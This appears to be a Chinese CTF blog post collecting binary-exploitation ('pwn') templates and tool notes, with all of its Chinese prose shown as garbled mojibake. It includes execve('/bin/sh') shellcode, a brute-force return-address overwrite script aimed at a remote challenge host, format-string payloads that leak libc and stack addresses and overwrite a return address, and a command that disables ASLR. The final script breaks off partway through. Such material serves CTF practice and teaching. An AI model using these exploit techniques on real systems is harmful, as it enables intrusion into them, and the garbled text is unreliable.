---
title: pwné¢˜æ¿å­
date: 2023-01-06 00:28:59 +0800
categories:
  - ctfæ¯”èµ›
tags:
  - pwn
  - ctf
permalink: /posts/id=50/
pin: false
published:
---

## åŸºç¡€æ¨¡æ¿ğŸ““

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ia()
```

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","") #typ="udp"
p = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(bytes(data))
sa      = lambda text,data          :p.sendafter(text, bytes(data))
sl      = lambda data               :p.sendline(bytes(data))
sla     = lambda text,data          :p.sendlineafter(text, bytes(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
l64     = lambda                    :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

ia()
```

ç²¾ç®€ç‰ˆ

```python
# _*_ coding:utf-8 _*_

from pwn import *
context.clear(arch='amd64', os='linux', log_level='debug')


p.interactive()
```



## PWNğŸ’¥æ€»è¦æœ‰ç‚¹æ‰‹æ³•


### pigchaé‡ç½®ç½‘ç»œ

```
\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Http Filters
```

### Docker with Pwn






### PatchæŒ‡ä»¤

```shell
patchelf --set-interpreter ~/Desktop/ld-linux-x86-64.so.2 --set-rpath ~/Desktop/ qwarmup

patchelf  --set-interpreter  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 --set-rpath /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/  /home/ef4tless/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libreadline.so.6

```

### AWDå‡ºé¢˜ç»éªŒ
#### ç¼–è¯‘æŒ‡ä»¤
```shell
 -fno-stack-protector


NXï¼š-z execstack / -z noexecstack (å…³é—­ / å¼€å¯) å †æ ˆä¸å¯æ‰§è¡Œ
Canaryï¼š-fno-stack-protector /-fstack-protector / -fstack-protector-all (å…³é—­ / å¼€å¯ / å…¨å¼€å¯) æ ˆé‡Œæ’å…¥cookieä¿¡æ¯
ASLRå’ŒPIEï¼š-no-pie / -pie (å…³é—­ / å¼€å¯) åœ°å€éšæœºåŒ–ï¼Œå¦å¤–æ‰“å¼€åä¼šæœ‰get_pc_thunk
RELROï¼š-z norelro / -z lazy / -z now (å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯) å¯¹GOTè¡¨å…·æœ‰å†™æƒé™
asmï¼šå†…è”æ±‡ç¼– -masm=intel
-sï¼šå»é™¤ç¬¦å·è¡¨
-m32 ç¼–è¯‘32ä½


ä¸€èˆ¬é¢˜ç›®éœ€è¦
# å˜æˆfastcall
-O2

strip ./pwn


```





### æ— çº¿å®‰å…¨

2.4GHzä¸5GHzéƒ½å±äºæ— çº¿ç”µï¼ˆé¢‘ç‡åœ¨3Hz-300HzèŒƒå›´å†…çš„ç”µç£æ³¢ï¼‰çš„é¢‘æ®µèŒƒå›´
èµ«å…¹ï¼ˆHzï¼‰åˆ°å…†èµ«å…¹ï¼ˆMHzï¼‰å’Œåƒå…†èµ«å…¹ï¼ˆGHzï¼‰

### CMSwebæ¡†æ¶æŸ¥æ‰¾

https://www.yunsee.cn/



### å®‰å“åˆ·æœº

å¡åˆ·ï¼ˆrecoveryï¼‰
å°†å®Œæ•´çš„åˆ·æœºåŒ…æ”¾å…¥æ‰‹æœºçš„sdcardä¸­
æ‰‹æœºè¿›å…¥recoveryæ¨¡å¼ç›´æ¥å®‰è£…ï¼Œæ•´ä¸ªå®‰è£…ä¸éœ€è¦ç”µè„‘å‚ä¸
ç®€å•å¿«æ·ï¼Œä¸æ˜“å‡ºé”™ï¼Œé€‚åˆæ–°æ‰‹

çº¿åˆ·ï¼ˆfastbootï¼‰
åˆ·æœºåŒ…åœ¨ç”µè„‘ä¸­ï¼Œåˆ©ç”¨åˆ·æœºè½¯ä»¶å¯¹æ‰‹æœºè¿›è¡Œåˆ·æœº
å®é™…ä¸Šæ‰‹æœºè¿›å…¥äº†fastbootæ¨¡å¼
éœ€è¦ç”µè„‘å®‰è£…å¥½æ‰‹æœºé©±åŠ¨å¹¶è¿æ¥
å®¹æ˜“å‡ºé”™ï¼Œä¸€èˆ¬ç”¨æ¥æ•‘ç –


OTAï¼ˆAndroid OSï¼‰
Over-The-Air ç©ºä¸­ä¸‹è½½æŠ€æœ¯
å°±æ˜¯æ‰‹æœºè®¾ç½®ä¸­æ›´æ–°æ“çºµç³»ç»Ÿï¼Œä¸‹è½½è¡¥ä¸åŒ…ï¼Œæ–‡ä»¶ä¸å¤§
æ‰‹æœºå°±åœ¨Android OSå±‚é¢å®Œæˆäº†è¡¥ä¸çš„ä¸‹è½½ï¼Œå¹¶è‡ªåŠ¨æ›´æ–°
ä¸€èˆ¬æ‰‹æœºrootåå°†ä¸å†æä¾›ç³»ç»Ÿæ›´æ–°

åˆ·æœºåŒ…ï¼šROM(æ“ä½œç³»ç»Ÿæ–‡ä»¶åŒ…){å†…æ ¸  åŸºå¸¦ï¼šå†³å®šäº†æ‰‹æœºå¯ä»¥ä½¿ç”¨çš„è¿è¥å•†æœåŠ¡}
### DNSåŠ«æŒ

```
114.114.114.114 //114 dns ç”±ä¸­å›½ç”µä¿¡è¿è¥å•†æä¾›
8.8.8.8   // google dns

nslookup [åŸŸåæˆ–IPåœ°å€] [DNSæœåŠ¡å™¨]


# æ£€æµ‹
nslookup whether.114dns.com 114.114.114.114
è¿”å›å›ç¯åœ°å€127.0.0.1å³è¢«åŠ«æŒï¼Œå¦åˆ™ä¸ºå…¬ç½‘IP
å¤§å¤šæ•°åŠ«æŒudp 53çš„dns


# å¼ºåˆ¶ä½¿ç”¨tcpè§£æåŸŸå
nslookup -vc whether.114dns.com 114.114.114.114
```

### tipsæ”¶é›†

```python
chr() # 16è¿›åˆ¶è½¬å­—ç¬¦
ord() # å­—ç¬¦è½¬16è¿›åˆ¶
ï¼….* s # è¡¨ç¤ºä»ä»¥ä¸‹ç¼“å†²åŒºæ‰“å°å‰Xä¸ªå­—ç¬¦
[rax] å–å€¼
# æŒ‡é’ˆå˜é‡
	ç±»å‹æ˜¯int*
	p = p+1;# +8(1*int)
    èµ‹å€¼è¯­å¥:èµ‹ç»™è°
    a = 3
    0x1234 a 0x0000003 0x0000000
    aå˜é‡åœ°å€ = 3

# åä¸‰ä½ç½®é›¶(Cè¯­è¨€)
stack_addr = stack_addr & (~0xfff);

# å…³é—­ALSR
echo 0 > /proc/sys/kernel/randomize_va_space

# åˆ‡æ¢pythonç‰ˆæœ¬
sudo update-alternatives --config python

# æœ¬åœ°patchelf
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath ./ qwarmup
patchelf --set-interpreter ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ld-linux-x86-64.so.2 --set-rpath ~/glibc-all-in-one/\libs/2.23-0ubuntu7_amd64/ ./pwn


# è™šæ‹Ÿæœº vscode
sudo apt install openssh-server
service sshd start

# busybox
busybox mkdir -p /usr/bin
busybox --install -s /usr/bin

# idaä½¿ç”¨æŠ€å·§
shift+E # å¯¼å‡ºæ•°æ®

# ç½‘ç»œå¯åŠ¨
sudo nmcli networking on

# /bin/sh
sh = 0x68732f6e69622f

# torçˆ¬è™«éªŒè¯
curl --socks5 localhost:9150 --socks5-hostname localhost:9150 -s https://check.torproject.org/ | cat | grep -m 1 Congratulations | xargs

# åº”ç”¨qilingç¯å¢ƒ
source ~/qilingenv/bin/activate

# è½¯è¿æ¥
ln -s cgibin hedwig.cgi
hedwig,cgi-> cgibin

# ida è½¬ asciiç 
é€‰ä¸­åŒºåŸŸæŒ‰a

# å¯»æ‰¾ä¸ºè½¬åŒ–å­—ç¬¦åœ°å€
æ‰”è¿›01editoræœç´¢

# ida
ç”¨åˆ°äº†å†æ›´æ–°
ç©ºæ ¼é”® ï¼šåæ±‡ç¼–çª—å£åˆ‡æ¢æ–‡æœ¬è·Ÿå›¾å½¢
ESCé€€åˆ°ä¸Šä¸€ä¸ªæ“ä½œåœ°å€
Gæœç´¢åœ°å€æˆ–è€…ç¬¦å·
Né‡å‘½å
åˆ†å·é”® ï¼šæ³¨é‡Š
ALT+M æ·»åŠ æ ‡ç­¾
CTRL+M åˆ—å‡ºæ‰€æœ‰æ ‡ç­¾
CTRL +S äºŒè¿›åˆ¶æ®µçš„å¼€å§‹åœ°å€ç»“æŸåœ°å€
C code å…‰æ ‡åœ°å€å‡ºå†…å®¹è§£ææˆä»£ç 
P åœ¨å‡½æ•°å¼€å§‹å¤„ä½¿ç”¨Pï¼Œä»å½“å‰åœ°å€å¤„è§£ææˆå‡½æ•°
D dataè§£ææˆæ•°æ®
A ASCIIè§£ææˆASCII
U unDefinedè§£ææˆæœªå®šä¹‰çš„å†…å®¹
X äº¤å‰å¼•ç”¨
F5 Cä¼ªä»£ç 
èœå•æ ä¸­çš„æœç´¢åŠŸèƒ½ä¸­
æœ‰ALT+T æœç´¢æ–‡æœ¬
ALT+B æœç´¢16è¿›åˆ¶ æœç´¢opcode å¦‚ELFæ–‡ä»¶å¤´
æ‰“å¼€æ–­ç‚¹åˆ—è¡¨ CTRL+ALT+B
å•æ­¥æ­¥å…¥ F7
å•æ­¥ä¸è¿‡ F8
è¿è¡Œåˆ°å‡½æ•°è¿”å›åœ°å€ CTRL+F7
è¿è¡Œåˆ°å…‰æ ‡å¤„ F4

shift+E å¯¼å‡ºæ•°æ®ï¼Œå¯æå–ä¸€äº›æ•°æ®
shift+? è®¡ç®—å™¨


# åå°è¿è¡Œ gohttpserver
sudo nohup ./gohttpserver -r ../share --port 80 1>/dev/null 2>&1 &

# å¿«é€Ÿèµ·é¢˜ç›®å’Œç«¯å£
socat tcp-l:8888,reuseaddr,fork exec:./blind
```


### glibcå¯¹åº”ç‰ˆæœ¬dockeræ‹‰å–
```
google æœç´¢å…³é”®å­— dockerhub 2.37-0ubuntu1
```


### hyper-V å’Œ VMware åˆ‡æ¢

å…³é—­hyper-V

wifiç½‘ç»œé€‚é…å™¨å³é”®å–æ¶ˆæ¡¥æ¥ï¼

<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/ccfaeb528b034a12b43b5bc415d209e5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" style="zoom: 33%;" />

```bash
bcdedit /set hypervisorlaunchtype off
bcdedit /set hypervisorlaunchtype auto
```

å¯ç”¨hyper-V

æ–°å»ºå¤–éƒ¨è™šæ‹Ÿç½‘ç»œ

### æœåŠ¡å™¨nginxæœåŠ¡å™¨

```bash
# å®‰è£…
sudo apt-get install nginx
# which nginx
# /usr/sbin/nginx -t
sudo nano /etc/nginx/conf.d/file_server.conf

server {
  listen 80; 
  server_name e4l4.com; # è‡ªå·±PCçš„ipæˆ–è€…æœåŠ¡å™¨çš„åŸŸå 
  charset utf-8; # é¿å…ä¸­æ–‡ä¹±ç  
  root /home/lighthouse/share; # å­˜æ”¾æ–‡ä»¶çš„ç›®å½• 
  location / { 
    autoindex on; # ç´¢å¼• 
    autoindex_exact_size on; # æ˜¾ç¤ºæ–‡ä»¶å¤§å° 
    autoindex_localtime on; # æ˜¾ç¤ºæ–‡ä»¶æ—¶é—´ 
  }
}

sudo rm /etc/nginx/sites-enabled/default
sudo service nginx reload


# å…³äºnginxçš„å‘½ä»¤
sudo /etc/init.d/nginx start|stop|reload|
sudo service nginx start|stop|reload|

```



### dockerå‘½ä»¤

```bash
# æ„å»ºé•œåƒï¼š
docker build -f /path/Dockerfile -t imgname(tag)
docker images
docker run -itd --name ycbsql -p 9999:9999 ycbsql
docker ps

# æŸ¥çœ‹é¡¹ç›®è¿è¡Œæ—¥å¿—
docker logs --tail 500 ycbsql

docker exec -it 115e791688f1 "/bin/bash"
```

### åå‘ä»£ç†

iox åå‘ä»£ç†

```bash
./iox proxy -l 9999 -l 1080

./iox proxy -r e4l4.com:9999
iox.exe proxy -r e4l4.com:9999
```

frpåå‘ä»£ç†

```shell
# å¤–ç½‘ç«¯
./frps -c frps.ini

# å†…ç½‘ç«¯
./frpc -c frpc.ini
```





### GDBè°ƒè¯•æŠ€å·§

```shell
# è°ƒè¯•è¿›ç¨‹
sudo gdb -p <pid>

# è°ƒè¯•å¤šçº¿ç¨‹ https://blog.csdn.net/gatieme/article/details/78309696
set follow-fork-mode [parent|child]		# è®¾ç½®è°ƒè¯•[çˆ¶è¿›ç¨‹/å­è¿›ç¨‹]
set detach-on-fork [on|off]				# æœªè°ƒè¯•è¿›ç¨‹[ç»§ç»­æ‰§è¡Œ/blockåœ¨forkä½ç½®]
show follow-fork-mode
show detach-on-fork
info inferiors				# æŸ¥çœ‹æ­£åœ¨è°ƒè¯•çš„è¿›ç¨‹ä¿¡æ¯
info threads				# æŸ¥è¯¢çº¿ç¨‹
thread <thread number>		# åˆ‡æ¢çº¿ç¨‹


# strace -ff -o test.txt ./dns -C ./dns.conf
```

```shell
# è®¾ç½®å¯„å­˜å™¨
set $rax=0
```

### æ ˆå¯¹é½

```c
movaps xmmword ptr [rsp + 0x50], xmm0
```

ä½¿ç”¨ **XMM** æ—¶ï¼Œéœ€è¦ **16Byte** å¯¹é½ï¼›ä½¿ç”¨ **YMM** æ—¶ï¼Œéœ€è¦ **32Byte** å¯¹é½ï¼›ä½¿ç”¨ **ZMM** æ—¶ï¼Œéœ€è¦ **64Byte** å¯¹é½ã€‚



### shellcode(æ±‡ç¼–)



```
mov        ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨ï¼Œ ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨é‡Œè¾¹çš„å€¼
lea          ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨,    ä¸€ä¸ªå˜é‡æˆ–è€…å¯„å­˜å™¨


cdq    æ‰§è¡Œårdxçš„å€¼ä¸º0x00000000æˆ–0xFFFFFFFF  
#  å­—èŠ‚ç ä¸º"\x99" è¡¨ç¤ºâ€œè½¬æ¢åŒå­—ä¸ºå››å­—â€ åœ¨æ‰§è¡Œ`cdq`æŒ‡ä»¤æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥`EAX`å¯„å­˜å™¨ä¸­çš„ç¬¦å·ä½ï¼ˆç¬¬31ä½ï¼‰ï¼Œå°†eaxæ‰©å±•åçš„ç¬¦å·ä½å¤åˆ¶åˆ°edxä¸­

jmp $-0x19  # çŸ­è·³è½¬ ç›¸å¯¹RIP

```





read()

```assembly
    mov rdi, r15
    xor eax, eax
    cdq
    mov al, 10
    mov dl, 7
    syscall # mprotect
    
    xor eax, eax
    mov esi, edi
    mov edi, eax
    mov dl, 0x7f
    syscall # read
    
# æ·»åŠ nop
p.send('\x90' * 0x16 + asm('''
    mov rsp, rsi
    add rsp, 0x1000

    xor rsi, rsi
    mul rsi # rax = 0

    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx

    mov rdi, rsp
    mov al, 59

    syscall # execve("/bin/sh",0,0)
'''))
```







### docker ç½‘æ¡¥åˆ é™¤

æ ¹æ®ä½ æä¾›çš„ç½‘ç»œè®¾å¤‡ä¿¡æ¯ï¼Œä½ æœ‰å¾ˆå¤š Docker ç½‘ç»œæ¡¥ï¼ˆbr-02e7e9c790beï¼Œbr-1df37dd21e5bï¼Œbr-4e91b786b58eï¼‰ä»¥åŠä¸€ä¸ªé»˜è®¤çš„ Docker ç½‘ç»œæ¡¥ï¼ˆdocker0ï¼‰ã€‚è¦åˆ é™¤è¿™äº› Docker ç½‘ç»œæ¡¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ Docker çš„å‘½ä»¤è¡Œå·¥å…·ã€‚

åœ¨ Docker ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ `docker network ls` å‘½ä»¤æ¥æŸ¥çœ‹æ‰€æœ‰çš„ç½‘ç»œã€‚ä½ å¯ä»¥çœ‹åˆ°æ¯ä¸ªç½‘ç»œçš„ IDã€åç§°ã€é©±åŠ¨å’ŒèŒƒå›´ã€‚ç„¶åä½ å¯ä»¥ä½¿ç”¨ `docker network rm` å‘½ä»¤æ¥åˆ é™¤ç‰¹å®šçš„ç½‘ç»œã€‚ä½ éœ€è¦ç”¨ç½‘ç»œçš„ ID æˆ–è€…åç§°ä½œä¸ºå‚æ•°ã€‚

ä¾‹å¦‚ï¼Œè¦åˆ é™¤ä¸€ä¸ªåä¸º `my_network` çš„ç½‘ç»œï¼Œä½ å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```
docker network rm my_network
```

å¦‚æœä½ æƒ³è¦åˆ é™¤æ‰€æœ‰çš„ç½‘ç»œï¼Œä½ å¯ä»¥å°† `docker network ls` çš„è¾“å‡ºï¼ˆä¹Ÿå°±æ˜¯æ‰€æœ‰ç½‘ç»œçš„ IDï¼‰ä¼ é€’ç»™ `docker network rm` å‘½ä»¤ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ é™¤æ‰€æœ‰ç½‘ç»œçš„ Bash è„šæœ¬ï¼š

```
docker network ls -q | xargs docker network rm
```

è¿™ä¸ªè„šæœ¬é¦–å…ˆä¼šç”¨ `docker network ls -q` æ¥è·å–æ‰€æœ‰ç½‘ç»œçš„ IDï¼Œç„¶åç”¨ `xargs` å°†è¿™äº› ID ä½œä¸ºå‚æ•°ä¼ é€’ç»™ `docker network rm`ï¼Œä»è€Œåˆ é™¤æ‰€æœ‰çš„ç½‘ç»œã€‚

è¯·æ³¨æ„ï¼Œè¿è¡Œè¿™ä¸ªè„šæœ¬éœ€è¦ Docker çš„ç›¸å…³æƒé™ã€‚å¦‚æœä½ åœ¨è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶é‡åˆ°äº†æƒé™é—®é¢˜ï¼Œä½ å¯èƒ½éœ€è¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œè¿™ä¸ªè„šæœ¬ã€‚æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç½‘ç»œæ­£åœ¨è¢«ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ä½¿ç”¨ï¼Œä½ éœ€è¦å…ˆåœæ­¢å’Œåˆ é™¤è¿™äº›å®¹å™¨ï¼Œæ‰èƒ½åˆ é™¤è¯¥ç½‘ç»œã€‚

### éšæœºæ•°è°ƒç”¨

```python
# éšæœºæ•°è°ƒç”¨
from ctypes import *
libc1 = cdll.LoadLibrary('./libc-2.31.so')
libc1.srand(0)
j = str((libc1.rand()+1)%3)
```

### Z3è§£é‡Šå™¨

```python
# _*_ coding:utf-8 _*_
from z3 import *

# ç”ŸæˆV3-V18å˜é‡
for i in range(3,19):
  locals()['v'+ str(i)]= Int('v%s'%i)

# x = Real('x') # æœ‰ç†æ•°

s = Solver()
s.add(v5 * v4 * v3 - v6 == 36182)
s.add(v3 == 19)
s.add(v5 * 19 * v4 + v6 == 36322)
s.add((v13 + v3 - v8) * v16 == 32835)
s.add((v4 * v3 - v5) * v6 == 44170)
s.add((v5 + v4 * v3) * v6 == 51590)
s.add(v9 * v8 * v7 - v10 == 61549)
s.add(v10 * v15 + v4 + v18 == 19037)
s.add(v9 * v8 * v7 + v10 == 61871)
s.add((v8 * v7 - v9) * v10 == 581693)
s.add(v11 == 50)
s.add((v9 + v8 * v7) * v10 == 587167)
s.add(v13 * v12 * v11 - v14 == 1388499)
s.add(v13 * v12 * v11 + v14 == 1388701)
s.add((v12 * v11 - v13) * v14 == 640138)
s.add((v11 * v5 - v16) * v12 == 321081)
s.add((v13 + v12 * v11) * v14 == 682962)
s.add(v17 * v16 * v15 - v18 == 563565)
s.add(v17 * v16 * v15 + v18 == 563571)
s.add(v14 == 101)
s.add((v16 * v15 - v17) * v18 == 70374)
s.add((v17 + v16 * v15) * v18 == 70518)


if s.check() == sat:
  result = s.model()
  print result

```



### çˆ†ç ´è„šæœ¬

å¦‚æœæ˜¯è¦†ç›–è¿”å›åœ°å€å¾—çˆ†ç ´

```python
count=1

while true :
        p=remote("nc.eonew.cn",10002)
        p.send('A'*0x80+'A'*8+'\xa6\x15\x04') #æ³¨æ„ä¸èƒ½ç”¨sendlineå¦åˆ™ä¼šè¯»å–'\n'
        p.recv()
        print(count)
        count += 1
        try:    
               p.recv(timeout=0.2)# [*] Got EOF while reading in interactive è½¬åŒ–ä¸º Traceback
               p.recv(timeout=0.2)
        except:
               p.close()
               continue
        break
ia()
```





## ç»éªŒä¸åˆ¤æ–­ğŸ§ 

scanfè¯»å…¥å †å— == å †æº¢å‡º

è®¡ç®—å™¨é¢˜ç›®

é€šå¸¸ç”¨æ ˆä½œä¸ºè®¡ç®—çš„ä½ç½®ï¼Œå³å­˜æ”¾è®¡ç®—çš„è¿‡ç¨‹ä¿¡æ¯ï¼Œ+-ç¬¦å·ç­‰

è¾“å‡ºç»“æœçš„åœ°æ–¹ç”¨æ•°ç»„å¼•ç´¢æ•°ç»„è¶Šç•Œ == æ³„éœ²libc





sizeä½ä¸ºä»€ä¹ˆè¦é™¤ä»¥8









## fmt

å…³äºå‡å»å­—èŠ‚æ•°
%æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œpæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ•°å­—éƒ¨åˆ†æŒ‰10è¿›åˆ¶ç®—ï¼Œä¸€ä¸ªæ•°å­—æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œhæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œnæ˜¯ä¸€ä¸ªå­—èŠ‚
ä½†æ˜¯å‡å»å‰è¾¹çš„å­—èŠ‚æ•°ä¸åŒ…æ‹¬å½“å‰çš„è¿™ä¸ª%å·ï¼å³
%2p   å‡2


###  éæ ˆä¸Šä¸€æ¬¡æ”¹ebpé“¾

fmtå·¥å…·çœ‹ä¸‹ç¬¬ä¸€æ¬¡æ”¹çš„åœ°å€åç§»ï¼Œå¦‚æœæ˜¯11 å°±ç»™11-2ä¸ªp
å…³äºå‡å»å‰è¾¹å¤šå°‘çš„å†…å®¹ï¼Œå‡å»çš„å€¼ä¸º%pè¾“å‡ºçš„é•¿åº¦

```python
pay = "%p"*0x9+ '%'+str(0)+'c%hn'  # æµ‹å‡ºå‰è¾¹æœ‰å¤šå°‘ä¸ªå­—èŠ‚ æ•°å­—-1å³å¯
pay += '%' + str((0x23+0xd8)) + 'c%37$hhn'

s(pay)

# print(hex(len('0x5624b86d10400x1000x7f67d9d161510xb(nil)0x7ffcdaca6cf00x93e041eb8ec261000x5624b86ce2600x7f67d9c27bf7')))

# 0x65
```

### æ ˆä¸Š

```python
# fmtstr_payload
payload ="%2c%310$hhn;%310$p".ljust(0x18)# ä¿®æ”¹æ ˆä¸Šçš„æŸä¸ªå€¼ä¸º2/æ³„éœ²libc
payload += fmtstr_payload(9,{ret_addr:start}, numbwritten=0x17)# ä¿®æ”¹è¿”å›åœ°å€ä¸ºstart


# ç¬¬ä¸€ä¸ªå‚æ•°ï¼šfmtstrå¼€å§‹çš„åœ°æ–¹çš„åç§»(é¢˜ç›®è¾“å…¥åç§»æ˜¯6ï¼Œfmtstr_payloadå¼€å§‹çš„åœ°æ–¹åç§»æ˜¯9)
# ç¬¬äºŒä¸ªå‚æ•°ï¼šret_addr : aaa -> bbb  å°†aaaæ”¹ä¸ºstart
# ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnumbwritten: fmtstr_payloadç”¨%cæ„æˆè¯»å…¥å­—èŠ‚æ•°ï¼Œè¿™é‡Œfmtstr_payloadå‰è¾¹æœ‰å†…å®¹æ‰€ä»¥è¦å‰ªæ‰å­—èŠ‚é•¿,0x17 = 0x18-1

```



### å †ä¸Š

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("127.0.0.1","10000")
p = process("./shell")
elf = ELF("./shell")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

# æ³„éœ²libcå’Œæ ˆåœ°å€
sa("> ",'echo '+'%6$p-%10$p')
sa("> ",'cat')
ru('0x')
libc_base = int(p.recv(12),16)-libc.sym['_IO_file_jumps']
lg('libc_base')
one = libc_base + 0xe3b01 
lg('one')
ru('0x')
stack_addr= int(p.recv(12),16)
lg('stack_addr')
ret = stack_addr+0x8
lg('ret')

# aaa(%17$p) : bbb(%45$p) -> ccc 
# aaa(%17$p) : bbb(%45$p) -> ret -> libc_function
# æ”¹aaaçš„åç§»å³æ”¹ccc

sa("> ",'echo '+'%' + str(ret & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one & 0xffff) + 'c%45$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str((ret+2) & 0xffff) + 'c%17$hn')
sa("> ",'cat')

sa("> ",'echo '+'%' + str(one>>16 & 0xff) + 'c%45$hhn')
sa("> ",'cat')

sa("> ",'exit\n')

ia()
```

### bssä¸Š

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

p = remote('node4.buuoj.cn', 29966) 
# p = process("./playfmt")
elf = ELF("./playfmt")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
